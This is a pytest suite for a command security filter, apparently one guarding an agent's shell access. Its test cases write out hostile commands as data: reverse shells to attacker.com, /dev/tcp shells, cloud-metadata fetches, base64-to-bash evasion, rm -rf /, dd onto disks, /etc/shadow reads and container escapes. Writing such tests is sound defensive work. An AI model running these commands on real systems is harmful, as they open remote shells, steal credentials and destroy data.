"""
Security Tests for CommandSecurityFilter.

Tests the command security filter against exploit examples defined in
config/security/command-filtering.yaml. Each rule has an 'exploit' field
containing a command that should trigger that rule.

Run with:
    pytest tests/security/test_command_security.py -v
    
Or with coverage:
    pytest tests/security/test_command_security.py -v --cov=src.core.command_security
"""
import pytest
from pathlib import Path
from typing import Generator

import sys
# Add project root to path for imports
PROJECT_ROOT = Path(__file__).parent.parent.parent
sys.path.insert(0, str(PROJECT_ROOT))

from src.core.command_security import (
    CommandSecurityFilter,
    SecurityRule,
    SecurityCheckResult,
    get_command_security_filter,
    check_command_security,
    _is_trusted_skill_command,
    _strip_quoted_content,
)


# =============================================================================
# Fixtures
# =============================================================================

@pytest.fixture
def security_filter() -> CommandSecurityFilter:
    """Create a fresh CommandSecurityFilter instance."""
    return CommandSecurityFilter()


@pytest.fixture  
def rules_path() -> Path:
    """Path to the security rules YAML file."""
    return PROJECT_ROOT / "config" / "security" / "command-filtering.yaml"


# =============================================================================
# Test: Rules Loading
# =============================================================================

class TestRulesLoading:
    """Test that security rules are loaded correctly."""
    
    def test_rules_file_exists(self, rules_path: Path) -> None:
        """Verify the rules file exists."""
        assert rules_path.exists(), f"Rules file not found: {rules_path}"
    
    def test_rules_loaded_successfully(self, security_filter: CommandSecurityFilter) -> None:
        """Verify rules load without errors."""
        assert security_filter.rules_loaded, "Rules should be loaded"
        assert security_filter.rule_count > 0, "Should have at least one rule"
    
    def test_has_block_rules(self, security_filter: CommandSecurityFilter) -> None:
        """Verify there are rules that block commands."""
        block_rules = security_filter.get_block_rules()
        assert len(block_rules) > 0, "Should have at least one blocking rule"
    
    def test_has_record_rules(self, security_filter: CommandSecurityFilter) -> None:
        """Verify there are rules that only record commands."""
        record_rules = security_filter.get_record_rules()
        assert len(record_rules) > 0, "Should have at least one record-only rule"
    
    def test_categories_exist(self, security_filter: CommandSecurityFilter) -> None:
        """Verify rules have categories."""
        categories = security_filter.get_categories()
        assert len(categories) > 0, "Should have at least one category"
        # Check for expected categories
        expected_categories = [
            "process_termination",
            "process_enumeration",
            "privilege_escalation",
            "destructive_operations",
        ]
        for cat in expected_categories:
            assert cat in categories, f"Expected category '{cat}' not found"


# =============================================================================
# Test: Exploit Examples (from rules file)
# =============================================================================

class TestExploitExamples:
    """Test that exploit examples from rules file are caught by their rules."""
    
    def test_all_block_exploits_are_blocked(self, security_filter: CommandSecurityFilter) -> None:
        """Every exploit example in a 'block' rule should be blocked."""
        exploits = security_filter.get_exploits_for_testing()
        
        for exploit, rule in exploits:
            if rule.action == "block" and exploit:
                result = security_filter.check_command(exploit)
                assert result.should_block, (
                    f"Exploit should be blocked: '{exploit}'\n"
                    f"Rule category: {rule.category}\n"
                    f"Rule pattern: {rule.pattern}"
                )
    
    def test_all_record_exploits_are_recorded(self, security_filter: CommandSecurityFilter) -> None:
        """Every exploit example in a 'record' rule should be allowed but recorded."""
        exploits = security_filter.get_exploits_for_testing()
        
        for exploit, rule in exploits:
            if rule.action == "record" and exploit:
                result = security_filter.check_command(exploit)
                assert result.allowed, (
                    f"Record-only exploit should be allowed: '{exploit}'\n"
                    f"Rule category: {rule.category}"
                )
                assert result.matched_rule is not None, (
                    f"Record-only exploit should match a rule: '{exploit}'"
                )


# =============================================================================
# Test: Process Termination Blocking
# =============================================================================

class TestProcessTermination:
    """Test blocking of process termination commands."""
    
    @pytest.mark.parametrize("command", [
        "kill -9 147",
        "kill 147",
        "kill -SIGKILL 147",
        "/bin/kill -9 1",
        "/usr/bin/kill 123",
        "  kill -9 1",  # Leading whitespace
        "echo test; kill -9 1",  # After semicolon
        "echo test && kill -9 1",  # After &&
    ])
    def test_kill_blocked(self, security_filter: CommandSecurityFilter, command: str) -> None:
        """Kill command variations should be blocked."""
        result = security_filter.check_command(command)
        assert result.should_block, f"Should block: {command}"
    
    @pytest.mark.parametrize("command", [
        "pkill python",
        "pkill -9 bash",
        "/usr/bin/pkill nginx",
    ])
    def test_pkill_blocked(self, security_filter: CommandSecurityFilter, command: str) -> None:
        """Pkill command should be blocked."""
        result = security_filter.check_command(command)
        assert result.should_block, f"Should block: {command}"
    
    @pytest.mark.parametrize("command", [
        "killall bash",
        "killall -9 python",
        "/usr/bin/killall apache2",
    ])
    def test_killall_blocked(self, security_filter: CommandSecurityFilter, command: str) -> None:
        """Killall command should be blocked."""
        result = security_filter.check_command(command)
        assert result.should_block, f"Should block: {command}"


# =============================================================================
# Test: Process Enumeration Blocking
# =============================================================================

class TestProcessEnumeration:
    """Test blocking of process enumeration commands."""
    
    @pytest.mark.parametrize("command", [
        "ps aux",
        "ps -ef",
        "ps -A",
        "/bin/ps aux",
        "/usr/bin/ps -ef",
    ])
    def test_ps_blocked(self, security_filter: CommandSecurityFilter, command: str) -> None:
        """Ps command should be blocked."""
        result = security_filter.check_command(command)
        assert result.should_block, f"Should block: {command}"
    
    @pytest.mark.parametrize("command", [
        "top -bn1",
        "htop",
        "pgrep python",
        "pidof bash",
        "pstree -p",
    ])
    def test_process_tools_blocked(self, security_filter: CommandSecurityFilter, command: str) -> None:
        """Process enumeration tools should be blocked."""
        result = security_filter.check_command(command)
        assert result.should_block, f"Should block: {command}"


# =============================================================================
# Test: /proc Access Blocking
# =============================================================================

class TestProcAccess:
    """Test blocking of /proc filesystem access."""
    
    @pytest.mark.parametrize("command", [
        "cat /proc/1/cmdline",
        "cat /proc/1/environ",
        "ls /proc/1/",
        "cat /proc/123/status",
        "head /proc/456/maps",
    ])
    def test_proc_pid_access_blocked(self, security_filter: CommandSecurityFilter, command: str) -> None:
        """Access to /proc/<pid>/ should be blocked."""
        result = security_filter.check_command(command)
        assert result.should_block, f"Should block: {command}"
    
    @pytest.mark.parametrize("command", [
        "cat /proc/net/tcp",
        "cat /proc/net/udp",
        "ls /proc/net/",
    ])
    def test_proc_net_blocked(self, security_filter: CommandSecurityFilter, command: str) -> None:
        """Access to /proc/net/ should be blocked."""
        result = security_filter.check_command(command)
        assert result.should_block, f"Should block: {command}"


# =============================================================================
# Test: Privilege Escalation Blocking
# =============================================================================

class TestPrivilegeEscalation:
    """Test blocking of privilege escalation attempts."""
    
    @pytest.mark.parametrize("command", [
        "sudo id",
        "sudo su",
        "sudo -i",
        "/usr/bin/sudo bash",
    ])
    def test_sudo_blocked(self, security_filter: CommandSecurityFilter, command: str) -> None:
        """Sudo command should be blocked."""
        result = security_filter.check_command(command)
        assert result.should_block, f"Should block: {command}"
    
    @pytest.mark.parametrize("command", [
        "su -",
        "su root",
        "/bin/su -",
    ])
    def test_su_blocked(self, security_filter: CommandSecurityFilter, command: str) -> None:
        """Su command should be blocked."""
        result = security_filter.check_command(command)
        assert result.should_block, f"Should block: {command}"
    
    @pytest.mark.parametrize("command", [
        "chmod 4755 /tmp/shell",
        "chmod u+s /tmp/backdoor",
        "chmod g+s /tmp/evil",
    ])
    def test_setuid_blocked(self, security_filter: CommandSecurityFilter, command: str) -> None:
        """Setting setuid/setgid should be blocked."""
        result = security_filter.check_command(command)
        assert result.should_block, f"Should block: {command}"


# =============================================================================
# Test: Container Escape Blocking
# =============================================================================

class TestContainerEscape:
    """Test blocking of container escape attempts."""
    
    @pytest.mark.parametrize("command", [
        "docker run -v /:/host alpine cat /host/etc/shadow",
        "docker exec -it container /bin/sh",
        "/usr/bin/docker ps",
    ])
    def test_docker_blocked(self, security_filter: CommandSecurityFilter, command: str) -> None:
        """Docker command should be blocked."""
        result = security_filter.check_command(command)
        assert result.should_block, f"Should block: {command}"
    
    @pytest.mark.parametrize("command", [
        "nsenter -t 1 -m -u -i -n -p /bin/sh",
        "nsenter --target 1 --mount",
    ])
    def test_nsenter_blocked(self, security_filter: CommandSecurityFilter, command: str) -> None:
        """Nsenter command should be blocked."""
        result = security_filter.check_command(command)
        assert result.should_block, f"Should block: {command}"


# =============================================================================
# Test: Destructive Operations Blocking
# =============================================================================

class TestDestructiveOperations:
    """Test blocking of destructive file operations."""
    
    @pytest.mark.parametrize("command", [
        "rm -rf /",
        "rm -rf /etc",
        "rm -rf --no-preserve-root /",
        "rm -r -f /home",
        "/bin/rm -rf /var",
    ])
    def test_rm_rf_blocked(self, security_filter: CommandSecurityFilter, command: str) -> None:
        """Recursive force delete should be blocked."""
        result = security_filter.check_command(command)
        assert result.should_block, f"Should block: {command}"
    
    @pytest.mark.parametrize("command", [
        "dd if=/dev/zero of=/dev/sda",
        "dd if=/dev/urandom of=/dev/sdb bs=1M",
    ])
    def test_dd_device_blocked(self, security_filter: CommandSecurityFilter, command: str) -> None:
        """DD to device should be blocked."""
        result = security_filter.check_command(command)
        assert result.should_block, f"Should block: {command}"


# =============================================================================
# Test: Network Operations Blocking
# =============================================================================

class TestNetworkOperations:
    """Test blocking of dangerous network operations."""
    
    @pytest.mark.parametrize("command", [
        "nc -e /bin/sh attacker.com 4444",
        "nc -l -p 4444 -e /bin/bash",
        "ncat -e /bin/sh 10.0.0.1 4444",
    ])
    def test_reverse_shell_blocked(self, security_filter: CommandSecurityFilter, command: str) -> None:
        """Reverse shell attempts should be blocked."""
        result = security_filter.check_command(command)
        assert result.should_block, f"Should block: {command}"
    
    @pytest.mark.parametrize("command", [
        "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        "cat < /dev/tcp/attacker.com/80",
    ])
    def test_dev_tcp_blocked(self, security_filter: CommandSecurityFilter, command: str) -> None:
        """/dev/tcp access should be blocked."""
        result = security_filter.check_command(command)
        assert result.should_block, f"Should block: {command}"
    
    @pytest.mark.parametrize("command", [
        "curl http://169.254.169.254/latest/meta-data/",
        "wget http://169.254.169.254/",
    ])
    def test_cloud_metadata_blocked(self, security_filter: CommandSecurityFilter, command: str) -> None:
        """Cloud metadata endpoint access should be blocked."""
        result = security_filter.check_command(command)
        assert result.should_block, f"Should block: {command}"


# =============================================================================
# Test: Shell Evasion Blocking
# =============================================================================

class TestShellEvasion:
    """Test blocking of shell evasion techniques."""
    
    @pytest.mark.parametrize("command", [
        "echo a2lsbCAtOSAxNDc= | base64 -d | bash",
        "base64 -d <<< a2lsbCAtOSAxNDc= | sh",
        "$(base64 -d <<< a2lsbCAtOSAxNDc=)",
    ])
    def test_base64_execution_blocked(self, security_filter: CommandSecurityFilter, command: str) -> None:
        """Base64 decode to shell should be blocked."""
        result = security_filter.check_command(command)
        assert result.should_block, f"Should block: {command}"
    
    @pytest.mark.parametrize("command", [
        "python3 -c 'import os; os.system(\"kill -9 147\")'",
        "python -c 'import subprocess; subprocess.call([\"kill\", \"-9\", \"1\"])'",
    ])
    def test_python_execution_blocked(self, security_filter: CommandSecurityFilter, command: str) -> None:
        """Python one-liner with system calls should be blocked."""
        result = security_filter.check_command(command)
        assert result.should_block, f"Should block: {command}"


# =============================================================================
# Test: System Manipulation Blocking
# =============================================================================

class TestSystemManipulation:
    """Test blocking of system manipulation commands."""
    
    @pytest.mark.parametrize("command", [
        "systemctl stop docker",
        "systemctl restart sshd",
        "/usr/bin/systemctl disable firewalld",
    ])
    def test_systemctl_blocked(self, security_filter: CommandSecurityFilter, command: str) -> None:
        """Systemctl command should be blocked."""
        result = security_filter.check_command(command)
        assert result.should_block, f"Should block: {command}"
    
    @pytest.mark.parametrize("command", [
        "shutdown -h now",
        "reboot",
        "poweroff",
        "halt",
        "init 0",
    ])
    def test_shutdown_commands_blocked(self, security_filter: CommandSecurityFilter, command: str) -> None:
        """Shutdown/reboot commands should be blocked."""
        result = security_filter.check_command(command)
        assert result.should_block, f"Should block: {command}"


# =============================================================================
# Test: Safe Commands Allowed
# =============================================================================

class TestSafeCommandsAllowed:
    """Test that safe commands are allowed."""
    
    @pytest.mark.parametrize("command", [
        "ls -la",
        "cat file.txt",
        "grep pattern file.txt",
        "find . -name '*.py'",
        "echo hello world",
        "pwd",
        "cd /workspace",
        "mkdir test_dir",
        "python script.py",
        "pip install -r requirements.txt",
        "git status",
        "git add .",
    ])
    def test_safe_commands_allowed(self, security_filter: CommandSecurityFilter, command: str) -> None:
        """Common safe commands should be allowed."""
        result = security_filter.check_command(command)
        assert result.allowed, f"Should allow: {command}"


# =============================================================================
# Test: Edge Cases
# =============================================================================

class TestEdgeCases:
    """Test edge cases and boundary conditions."""
    
    def test_empty_command(self, security_filter: CommandSecurityFilter) -> None:
        """Empty command should be allowed (handled elsewhere)."""
        result = security_filter.check_command("")
        assert result.allowed, "Empty command should pass filter"
    
    def test_whitespace_only(self, security_filter: CommandSecurityFilter) -> None:
        """Whitespace-only command should be allowed."""
        result = security_filter.check_command("   ")
        assert result.allowed, "Whitespace command should pass filter"
    
    def test_case_insensitive(self, security_filter: CommandSecurityFilter) -> None:
        """Rules should match case-insensitively."""
        result = security_filter.check_command("KILL -9 147")
        assert result.should_block, "KILL (uppercase) should be blocked"
    
    def test_reload_rules(self, security_filter: CommandSecurityFilter) -> None:
        """Rules should reload successfully."""
        original_count = security_filter.rule_count
        success = security_filter.reload_rules()
        assert success, "Rules should reload successfully"
        assert security_filter.rule_count == original_count, "Rule count should be same after reload"


# =============================================================================
# Test: Module-level Functions
# =============================================================================

class TestModuleFunctions:
    """Test module-level convenience functions."""
    
    def test_get_command_security_filter(self) -> None:
        """Should return singleton filter instance."""
        filter1 = get_command_security_filter()
        filter2 = get_command_security_filter()
        assert filter1 is filter2, "Should return same instance"
    
    def test_check_command_security(self) -> None:
        """Convenience function should work."""
        result = check_command_security("ls -la")
        assert isinstance(result, SecurityCheckResult)
        assert result.allowed


# =============================================================================
# Test: Fail-Closed Behavior
# =============================================================================

class TestFailClosed:
    """Test fail-closed security behavior."""
    
    def test_fail_closed_on_missing_rules(self) -> None:
        """Filter should fail-closed when rules file is missing."""
        filter = CommandSecurityFilter(
            rules_path=Path("/nonexistent/rules.yaml"),
            fail_closed=True
        )
        result = filter.check_command("ls -la")
        assert result.should_block, "Should block when rules not loaded (fail-closed)"
    
    def test_fail_open_when_configured(self) -> None:
        """Filter should fail-open when configured."""
        filter = CommandSecurityFilter(
            rules_path=Path("/nonexistent/rules.yaml"),
            fail_closed=False
        )
        result = filter.check_command("ls -la")
        assert result.allowed, "Should allow when rules not loaded (fail-open)"


# =============================================================================
# Test: Trusted Skill Bypass Prevention
# =============================================================================

class TestTrustedSkillBypass:
    """Test that the trusted skill path check cannot be bypassed."""

    def test_legitimate_skill_path_allowed(self) -> None:
        """A script in a legitimate skill path should be trusted."""
        assert _is_trusted_skill_command("python3 /skills/my_skill/run.py")

    def test_legitimate_user_skill_allowed(self) -> None:
        """A script in user-skills path should be trusted."""
        assert _is_trusted_skill_command("bash /user-skills/custom/task.sh")

    def test_legitimate_venv_script_allowed(self) -> None:
        """A script in user venv should be trusted."""
        assert _is_trusted_skill_command("python3 /venv/bin/some_tool.py")

    def test_substring_bypass_blocked(self) -> None:
        """A path containing '/skills/' as substring but not starting with it should NOT be trusted."""
        assert not _is_trusted_skill_command("python3 /tmp/evil/skills/malicious.py")

    def test_substring_bypass_user_skills_blocked(self) -> None:
        """A path containing '/user-skills/' as substring should NOT be trusted."""
        assert not _is_trusted_skill_command("python3 /tmp/hacked/user-skills/exploit.py")

    def test_substring_bypass_venv_blocked(self) -> None:
        """A path containing '/venv/' as substring should NOT be trusted."""
        assert not _is_trusted_skill_command("python3 /tmp/fake/venv/evil.py")

    def test_dot_dot_traversal_blocked(self) -> None:
        """Path traversal with .. should NOT bypass the check."""
        assert not _is_trusted_skill_command("python3 /skills/../tmp/evil.py")

    def test_dot_dot_traversal_user_skills_blocked(self) -> None:
        """Path traversal with .. from user-skills should NOT bypass."""
        assert not _is_trusted_skill_command("python3 /user-skills/../../etc/passwd.py")

    def test_non_script_extension_blocked(self) -> None:
        """Files without script extensions should not be trusted."""
        assert not _is_trusted_skill_command("python3 /skills/data.txt")

    def test_untrusted_interpreter_blocked(self) -> None:
        """Non-trusted interpreters should not be trusted."""
        assert not _is_trusted_skill_command("perl /skills/my_skill/run.py")

    def test_no_arguments_blocked(self) -> None:
        """A bare interpreter should not be trusted."""
        assert not _is_trusted_skill_command("python3")

    def test_compound_cd_and_skill(self) -> None:
        """Compound 'cd . && python3 /skills/...' should be trusted."""
        assert _is_trusted_skill_command(
            "cd . && python3 /skills/create_image/image_gen.py \"Create top 3\""
        )

    def test_compound_cd_and_user_skill(self) -> None:
        """Compound 'cd dir && bash /user-skills/...' should be trusted."""
        assert _is_trusted_skill_command(
            "cd /workspace && bash /user-skills/my_skill/run.sh --verbose"
        )

    def test_compound_semicolon_skill(self) -> None:
        """Compound 'echo hi; python3 /skills/...' should be trusted."""
        assert _is_trusted_skill_command(
            "echo starting; python3 /skills/deep-research/run.py"
        )

    def test_compound_pipe_not_trusted(self) -> None:
        """Pipe to skill script is NOT a skill execution."""
        assert not _is_trusted_skill_command(
            "echo data | python3 /tmp/evil.py"
        )

    def test_compound_with_traversal_blocked(self) -> None:
        """Compound command with path traversal should NOT be trusted."""
        assert not _is_trusted_skill_command(
            "cd . && python3 /skills/../tmp/evil.py"
        )


# =============================================================================
# Test: False Positive Prevention
# =============================================================================

class TestFalsePositivePrevention:
    """Test that common words in quoted arguments don't trigger command-name blocks."""

    @pytest.mark.parametrize("command", [
        'python3 script.py "show the top 3 folders"',
        'python3 scan.py "top results by count"',
        "echo 'the top priority items'",
        'python3 image_gen.py "Create infographic with top folders"',
    ])
    def test_top_in_quotes_not_blocked(
        self, security_filter: CommandSecurityFilter, command: str
    ) -> None:
        """The word 'top' inside quoted arguments should NOT trigger the top block."""
        result = security_filter.check_command(command)
        assert result.allowed, f"Should NOT block: {command}"

    @pytest.mark.parametrize("command", [
        "top -bn1",
        "  top",
        "echo test; top -bn1",
        "echo test && top",
    ])
    def test_actual_top_command_still_blocked(
        self, security_filter: CommandSecurityFilter, command: str
    ) -> None:
        """The actual 'top' command should still be blocked."""
        result = security_filter.check_command(command)
        assert result.should_block, f"Should block: {command}"

    @pytest.mark.parametrize("command", [
        'python3 gen.py "kill the process of generating"',
        'echo "do not kill this task"',
        'python3 report.py "overkill approach"',
    ])
    def test_kill_in_quotes_not_blocked(
        self, security_filter: CommandSecurityFilter, command: str
    ) -> None:
        """The word 'kill' inside quoted arguments should NOT trigger the kill block."""
        result = security_filter.check_command(command)
        assert result.allowed, f"Should NOT block: {command}"

    @pytest.mark.parametrize("command", [
        'python3 script.py "halt the execution"',
        'python3 report.py "do not halt progress"',
    ])
    def test_halt_in_quotes_not_blocked(
        self, security_filter: CommandSecurityFilter, command: str
    ) -> None:
        """The word 'halt' inside quoted arguments should NOT trigger the halt block."""
        result = security_filter.check_command(command)
        assert result.allowed, f"Should NOT block: {command}"

    @pytest.mark.parametrize("command", [
        'python3 script.py "ps: this is a note"',
        'echo "ps output goes here"',
    ])
    def test_ps_in_quotes_not_blocked(
        self, security_filter: CommandSecurityFilter, command: str
    ) -> None:
        """The word 'ps' inside quoted arguments should NOT trigger the ps block."""
        result = security_filter.check_command(command)
        assert result.allowed, f"Should NOT block: {command}"

    def test_content_pattern_still_matches_in_quotes(
        self, security_filter: CommandSecurityFilter
    ) -> None:
        """Content patterns like /proc/1/ should still match inside quotes."""
        result = security_filter.check_command('cat "/proc/1/cmdline"')
        assert result.should_block, "Should block /proc/1/ even in quotes"

    def test_content_pattern_etc_shadow_in_quotes(
        self, security_filter: CommandSecurityFilter
    ) -> None:
        """Content patterns like /etc/shadow should still match inside quotes."""
        result = security_filter.check_command('cat "/etc/shadow"')
        assert result.should_block, "Should block /etc/shadow even in quotes"


# =============================================================================
# Test: Quote Stripping Helper
# =============================================================================

class TestStripQuotedContent:
    """Test the _strip_quoted_content helper function."""

    def test_single_quotes_stripped(self) -> None:
        assert _strip_quoted_content("echo 'hello world'") == 'echo ""'

    def test_double_quotes_stripped(self) -> None:
        assert _strip_quoted_content('echo "hello world"') == 'echo ""'

    def test_mixed_quotes(self) -> None:
        result = _strip_quoted_content("""echo "hello" 'world'""")
        assert result == 'echo "" ""'

    def test_no_quotes_unchanged(self) -> None:
        assert _strip_quoted_content("ls -la /tmp") == "ls -la /tmp"

    def test_escaped_quote_inside(self) -> None:
        result = _strip_quoted_content(r'echo "hello \"world\""')
        assert result == 'echo ""'

    def test_empty_quotes_preserved(self) -> None:
        assert _strip_quoted_content('echo ""') == 'echo ""'

    def test_command_tokens_preserved(self) -> None:
        result = _strip_quoted_content('cd . && python3 script.py "the top 3"')
        assert "cd" in result
        assert "python3" in result
        assert "top" not in result


# =============================================================================
# Test: Compound Skill Commands with Security Filter
# =============================================================================

class TestCompoundSkillIntegration:
    """End-to-end tests for compound commands with skill scripts."""

    def test_cd_and_skill_with_top_in_args(
        self, security_filter: CommandSecurityFilter
    ) -> None:
        """cd . && python3 /skills/script.py 'show top 3' should be allowed."""
        result = security_filter.check_command(
            "cd . && python3 /skills/create_image/image_gen.py "
            '"Create infographic of top 3 folders"'
        )
        assert result.allowed, "Trusted skill with 'top' in args should be allowed"

    def test_skill_with_kill_in_args(
        self, security_filter: CommandSecurityFilter
    ) -> None:
        """python3 /skills/script.py 'kill the process' should be allowed."""
        result = security_filter.check_command(
            'python3 /skills/debug/analyze.py "kill the stale connections"'
        )
        assert result.allowed, "Trusted skill with 'kill' in args should be allowed"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
